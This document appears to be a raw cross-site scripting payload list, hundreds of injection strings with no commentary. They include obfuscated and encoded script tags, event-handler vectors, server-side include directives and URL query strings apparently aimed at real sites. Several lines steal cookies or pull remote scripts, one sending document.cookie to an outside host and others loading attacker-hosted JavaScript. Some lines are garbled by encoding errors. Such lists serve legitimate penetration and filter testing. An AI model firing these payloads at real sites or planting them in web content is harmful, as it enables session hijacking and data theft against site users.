&kw=%27;alert%28%27XSS%27%29;//
&action=search&firstRequest=1&query=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&x=30&y=17&searchindex=gsa
"<img\\x32src=x onerror=""javascript:alert(1)"">"
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">"
<img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
"<script>x=""""<<prompt(9)<<"""";y=42;</script>"
â€œ><sâ€%2bâ€cript>alert(1)</script>
&#x00003e
"(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}//<img src=""x:x"" onerror=""if(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}"">"
"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>"
"<!--#exec cmd=""cd C:\WINDOWS\System32"">"
1/confirm(1)
"<object><param name=""src"" value=""javascript:alert(0)""></param></object>"
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">"
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">"
"<img \x39src=x onerror=""javascript:alert(1)"">"
</script>
"<form name=self location=""javascript&amp;#58;alert(1)""></form><script>if(top!=self){top.location=self.location}</script>"
"<meta http-equiv=""X-UA-Compatible"" content=""IE=5""><a style=""font-family:}behavior=URL(\.sct)"">B"
&#X3c;
<SCRIPT SRC=//ha.ckers.org/.j>
"'><a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(1)"">XXX</a>"
"'><img src='vbscript:do%63ument.lo%63ation=""http://127.0.0.1:3555/xss_serve_payloads/X.html""'>"
%uff1cscript%uff1ealert(\x18XSS\x19);%uff1c/script%uff1e
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF"
<// style=x:expression\28write(1)\29>
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
&l=eaedfaedae%22);}alert('xss');{//
"1&""><script>alert(1)</script>=1"
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS"
"""<A HREF=""""http://0x42.0x0000066.0x7.0x93/"""">XSS</A>"""
"<IMG SRC=# onmouseover=""alert('X')"">"
"&lt;label class=""&lt;% confirm(1) %&gt;""&gt;"
"""><IMG SRC=javascript:alert(1)>"
<form name=location >
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
%253cscript%253ealert(document.cookie)%253c/script%253e
'><script>alert(123);</script x='
&content=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>"
"'><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/X/) type=submit>'-->""></script><script>alert(1)</script>"
<<script>document.cookie=true;</script>
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""X"")>"
"'><A HREF=""//google"">X</A>"
"a=""get"";b=""URL(\"""";c=""javascript:"";d=""alert(1);\"")"";eval(a+b+c+d);"
"""+onkeypress=""prompt(23)""+"
"""><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//"
"<base href=""javascript:\""> <a href=""//%0a%0dconfirm(2);//"">XSS</a>"
"<img src=""http://127.0.0.1:3555/xss_serve_payloads/gif.gif"" onerror=alert(1)>"
"&lt;IMG SRC=\""javascript&#058;alert('XSS');\""&gt;"
}*{color:#ccc;}
a=/ev/// .source a+=/al/// .source a[a] (name)
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
"""><script crossorigin>alert(1);</script>"
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>"
">""<STYLE>li {list-style-image: url(""javascript:document.cookie=true;"");</STYLE><UL><LI>CrossSiteScripting"
&h=4&z=350&al='><script>alert(1234)</script>&st=y
&page=servicefaq&geo='-location.replace('//1653309246')-'&product=ipad
"a=""get"";b=""URL(ja\"""";c=""vascr"";d=""ipt:ale"";e=""rt('XSS');\"")"";eval(a+b+c+d+e);"
"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;XSS&lt;/A&gt;"
"<!--#echo var=""document_uri"" -->"
"<!--#echo var=""http_user_agent"" -->"
<script>var location={};</script>
+onerror=prompt(1)%3E/
javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108))
"&';}},{scope:'email,user_about_me,user_hometown,user_interests,user_likes,user_status,user_website,user_birthday,publish_stream,publish_actions,offline_access'});}alert(0);b=function(response){c=({a:{//"
"<IMG%20SRC=""jav&#x09;ascript:alert('WXSS');"">"
'><scr<script>ipt>alert(1)</scr</script>ipt>
<body/onhashchange=alert(1)><a href=#>clickit
"'><img src=1 href=1 onerror=""javascript:alert(1)""></img>"
"<img\x11src=x onerror=""javascript:alert(1)"">"
"<script\\x20type=""text/javascript"">javascript:alert(1);</script>"
"&name=Search&action=search&overview=1&bool=AND&active_polling%0D%0Aweblinks=1&active_address_book=1&active_consultation=1&active_forum=1&active_requirements=1&active_calendar=1&active_guestbook=1&active_questionnaire=1&active_seminar=1&active_stories=1&active_downloads=1&active_users=1&active_subjects=1&q=1%22+onmouseover=alert%28String.fromCharCode%2872,101,108,108,111,32,87,111,114,108,100,33%29%29+&search=&search_area=all"
javascript&#x3A;alert&lpar;1&rpar;
<x ondblclick=alert(1)>double click this!
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
"&lt;META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==""&gt;"
&firstname=%22%3E%3Cscript%3Edocument.body.innerHTML%20%3D% 20%22%3Cblink%20style%3D'color%3A%20red%3B%20font-size%3A%2080px%3B'%3ELocked%20my%20ass!%3C% 2Fblink%3E%22%3B%3C/script%3E%3Cx
<img src=x onerror=prompt(1)>
"<script>x=""""?prompt(9):"""";y=42;</script>"
"""</script><svg><script>alert(1)+&quot;"";"
<iframe src=x onerror=prompt(1)>
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>"
<body onactivate=alert(1)>
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
"'><isindex action=""javascript:alert(1)"" type=image>"
"<EMBED SRC=""http://vulnerability-lab.com/CrossSiteScripting.swf"" AllowScriptAccess=""always""></EMBED>"
<h1><font color=blue>hellox worldss</h1>
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\\""xss\\"" implementation=\\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;"
"<svg><script/href=""xss.cx/xss.js""//>"
' onmouseover=confirm(document.location)
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>"
'><script>prompt(1)</script>
"<script xmlns=""http://www.w3.org/1999/xhtml"">&#x61;l&#x65;rt&#40;1)</script>"
&{alert(1);};
'><script>alert(1);</script>
<BODY ONLOAD=alert('XSS')>
'><object type=image src=X.gif onreadystatechange=alert(1)></object>
%3Cdiv%20style=-webkit-writing-mode:vertical-rl%3Boverflow:scroll%20onscroll=alert(1)%3E
<form href='x'onclick=popup=1;><select>
"<img src=x onerror=\x12""javascript:alert(1)"">"
<x contenteditable onpaste=alert(1)>paste here!
<img onerror=a&#x0006c;ert(1) src=a>
"<!DOCTYPE x[<!ENTITY x SYSTEM ""http://127.0.0.1:3555/xss_serve_payloads/X.html"">]><y>&x;</y>"
<svg><script>123<1>alert(123)</script>
<video onprogress=alert(1)><source src=x>
<<script>alert(1);</script>
"""<LINK REL=""""stylesheet"""" HREF=""""javascript:alert('XSS');"""">"""
&a=0I_2QhAGaI8&u=%2Fwatch%3Fv%3DTnZ7unBHWLQ%26feature%3Dshare
javascript&colon;alert(1)
"<p class=""comment"" title=""""><svg/a=""></p>"
"<img src=""javascript:alert(\'XSS\');"">"
"<div title=""%&gt;&lt;/script&gt;&quot;&lt;img src=1 onerror=confirm(1)&gt;""></div>"
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
&q=%3Cscript%3Ealert%28%221%22%29%3C/script%3E
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
&lt;
"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>"
<svg onload=prompt(1);>
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
"<? echo('<scr)'; echo('ipt>alert(""XSS"")</script>'); ?>"
"<""<o<n<b<l<u<r<=<&apos;<`"
"<A HREF=""//127.0.0.1:3555/xss_serve_payloads/X.html"">X</A>"
"<iframe src=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e""></iframe>"
"""><<script>alert(document.cookie);//<</script>"
"&lt;?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""&gt;"
&#X000003C
<script>eval(location.hash.slice(1)</script>
http://a/%%30%30
'><body oninput=prompt(1)><input autofocus>
"<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>"
"""><img o[%00]nerror=alert(1) src=a>"
"""><SCRIPT a="">"" SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""></SCRIPT>"
"<SCRIPT+a="">\'>"" SRC=""http://localhost""></SCRIPT>"
"<script>alert(String.fromCharCode(75,67,70))</script>"
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>"
&SearchID=3125843&SearchRefineID=6695888&KeyWord=l%22%3E%3Cscript%20src=%22http://www.yourjavascript.com/38310202111/xss.js%22%20/%3E
/<script>alert(1234)</script>
"<XML ID=0><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert(1)""&gt;</B></I></XML>"
&xfrom=1&search=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E&ind=1&zoek1=yes
<img src=javascript:alert(&quot;XSS&quot;)>
"'><div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>"
"<!--#echo var=""http_accept_encoding"" -->"
<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
"<a href=""javascript\\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<!--#echo var=""server_name -->"
"JSON.parse('{""__proto__"":[""a"",1]}')"
%3Cscript%0Baaa%3Ealert%281%29%3C/script%0Baaaa%3E
"'><svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:\u0061lert(1);""></g></svg>"
"<SCRIPT ="">"" SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""></SCRIPT>"
<img/ src//'onerror/''/=confirm(1)//'>
"![a'""`onerror=prompt(document.cookie)](x)\"
&q=%22%3E%3Cscript%3E+-+-1-+-+alert%28/XSSPOSED/%29%3C/script%3E
"'><div style=""color:rgb(''&#0;x:expression(alert(1))""></div>"
"<img src=x\x13onerror=""javascript:alert(1)"">"
'><style><!--</style><script>alert(1);//--></script>
"x=""<%"";"
"""><frameset onload=alert(1)>"
<body/onpageshow=alert(1);>
"<script>document.cookie=""testefar=4704;""</script>"
"[].constructor.constructor(""alert"" + ""(1)"")()"
"<img \\x47src=x onerror=""javascript:alert(1)"">"
"%3E%3Cbody%20onload=javascript:alert(1)# var sc=escape(document.cookie);var d=escape(document.location);var mI=new Image();mI.src=""http://host?a=""+d+""&b=""+ sc;"
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"
'><scr%00ipt%20&message=> alert(â€˜Xâ€™)</script>
"""<LINK REL=""""stylesheet"""" HREF=""""http://ha.ckers.org/xss.css"""">"""
"getURL(""javascript:alert(\'XSS\')"")"
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>"
"<img src\x47=x onerror=""javascript:alert(1)"">"
<%/z=%&gt&lt;p/&#111;nresize&#x3d;alert(1)//>
"prototype.join=function(){confirm(""PWND:""+document.body.innerHTML)}')();"
<scri%00pt>confirm(1);</scri%00pt>
%3E%3Cbody%20onload=javascript:alert(1)%3E
<script/src=//xss.cx>/*
"<script src='data:text/javascript,prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>"
<frameset onload=alert(123)>
"<a href=""javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"" /></a>"
&text=%3C%2Fgrkgnern%3E%3Cfpevcg%3Enyreg%280%29%3C%2Ffpevcg%3E
"</script ""//'//><svg%0Aonload=alert(1)//>"
"&action=advanced_search&query=""><script>alert('XSS')</script>"
"<!--#echo var=""server_port"" -->"
">""<XML ID=""CrossSiteScripting""><I><B><IMG SRC=""javas<!-- -->cript:document.cookie=true""></B></I></XML><SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
"""onmouseover=alert(1)//"
"""></TITLE><SCRIPT>alert(1);</SCRIPT>"
"""><input autofocus onfocus=alert(1)>"
"<DIV STYLE=""background-image: url(&#1;javascript:alert(1))"">"
"""><svg><script>alert`1`"
"<IMG LOWSRC=""javascript:alert('CrossSiteScripting')"">"
&#0060
<iframe src=http://ha.ckers.org/scriptlet.html <
"&start=41&perpage=10&col=ndguard&summary=""'/><script>alert(String.fromCharCode(88,83,83))</script>"
"""><xml src=""javascript:alert(1);"">"
"<!--jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e-->"
<svg onload=1?alert(9):0>
"""\""\/><option>'><button><img src=x onerror=confirm(1);></button></option>"","
"[A]<? foo=""><script>alert(1)</script>""><! foo=""><script>alert(1)</script>""></ foo=""><script>alert(1)</script>"">[B]<? foo=""><x foo='?><script>alert(1)</script>'>"">[C]<! foo=""[[[x]]""><x foo=""]foo><script>alert(1)</script>"">[D]<% foo><x foo=""%><script>alert(1)</script>"">"
"""><form action=""Javascript:alert(1)""><input type=submit>"
"'><iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>"
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>"
&q=%3C/title%3E%3Cscript%3Ealert%280%29%3C/script%3E%3Ctitle%3E&mpb=1&SearchSourceOrigin=19
<img/src=x:\u0070r\u006fmp\u0074(alt) onerror=x:e\u0076al(src) alt=&#088;&#083;&#083;>
&#x00003E
vbscript&#00058;confirm(1);
"<%=	puts	""test""	%>"
"""><iframesrc=""javascript:alert(2)"">"
"<script>this[""alert""](""X"")</script>"
<svg><div onactivate=alert('Xss') id=xss style=overflow:scroll>
'><body onbeforeactivate=alert(1)>
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">"
'><event-source src=javascript:alert(1)>
"""></script ""/*'/*><img/src=x */; onerror=alert(1) //"
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<img onerror=`alert(1)`src=a>
"<IMG+SRC=""jav%0dascript:alert(1);"">"
"<script>write(Ã¢â‚¬Å“<img/src=//xss.cx/?Ã¢â‚¬Â+cookie.replace(/\s/g,"""")+Ã¢â‚¬Å“>Ã¢â‚¬Â)></script>"
<img/src=aaa.jpg onerror=prompt(1);>
<scr<object>ipt>alert(1)</script>
&rm=listresults&filter=datedesc&keywords=%3C/script%3E%3Cscript%20src=http://goonmaster.agilityhoster.com/replace.js%3E%3C/script%3E%3Cscript%3E&x=0&y=0
"<IMG%20SRC=""jav	ascript:alert('WXSS');"">"
&keyword=%22%3E%3Cscript%3Ealert%28%270%27%29;%3C/script%3E
<source onclick=popup=1; ><frameset/onload=popup=1;>
JavaSCript:alert(123)
"<a href=""#"" ping=""file://%00/%00/x"">Boom</a><script>document.querySelector('a').click();</script>"
&proxystylesheet=DCUK&site=ukDiscovery&client=DCUK&region=uk&output=xml_no_dtd&getfields=*&filter=1&ie=utf8&oe=utf8&q=%22;+alert%28%22XSS%22%29;//&searchbtn=go
<Å¿vg><Å¿cript/href=//â’•â‚¨>
"""><script>eval(â€˜a\l\ert\(1\)â€™);</script>"
<script>alert(document.head.childNodes[3].text)</script>
"<!--<img src=""--><img src=x onerror=alert(XSS)//"">"
'><svg+onload=confirm(1);>
&partNumber=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
"""><DIV STYLE=""background-image: url(&#1;javascript:alert(1))"">"
<iframe src=javascript:alert(1)>
"<script>x=""""/prompt(9)/"""";y=42;</script>"
&#X000003C
"</script><script src=""https://static.jsbin.com/js/render/edit.js?3.35.11""></script><script>jsbinShowEdit && jsbinShowEdit({""static"":""https://static.jsbin.com"",""root"":""https://jsbin.com""});</script><script>"
"<div/style=""width:expression(confirm(1))"">X</div>"
<object data=//0me.me/demo/xss/xssproject.swf?js=alert(document.domain); allowscriptaccess=always></object> // Soroush Dallili
"""><body oninput=alert(1)><input autofocus>"
&success_page=%2F%22%3E%3Ch1%3EXSS%20by%20PsychoMantis%3C/h1%3E%27%22%3E%3C/title%3E%3Cscript%3E%20alert%28%22XSSPOSED%22%29%3C/script%3E%3E/
<x onxxx=1 onxxx=1
"5.replace(/XSS/g,confirm)"
<// style=x:expression\\28write(1)\\29>
"`""\'><img src=xxx:x \\x0Donerror=javascript:alert(1)>"
"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>"
"&DM_NUMBER=""><img/onerror=document.write('\\x58\\x53\\x53'); src=./>"
alert(1)
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
">""<!-- -- --><script>document.cookie=true;</script><!-- -- -->"
&#x000003c;
"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>"
">""<LINK REL=""stylesheet"" HREF=""javascript:document.cookie=true;"">"
top[630038579..toString(30)](1)
"<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>"
"<b>drag and drop one of the following strings to the drop box:</b><br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b><br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/><div id=""dropbox"" style=""height: 360px;width: 500px;border: 5px solid #000;position: relative;"" ondragover=""event.preventDefault()"">+ Drop Box +</div>"
"ABC<div style=""x:\\xE2\\x80\\x81expression(javascript:alert(1)"">DEF"
&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;
"â€˜;alert(String.fromCharCode(75,67,70))"
JaVaScRipT:confirm(1)
"&lt;IMG SRC=""jav&#x09;ascript:alert(1);""&gt;"
"""><marquee/onstart=confirm(2)>/"
'><object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf
'><SCRIPT>alert(1);</SCRIPT>
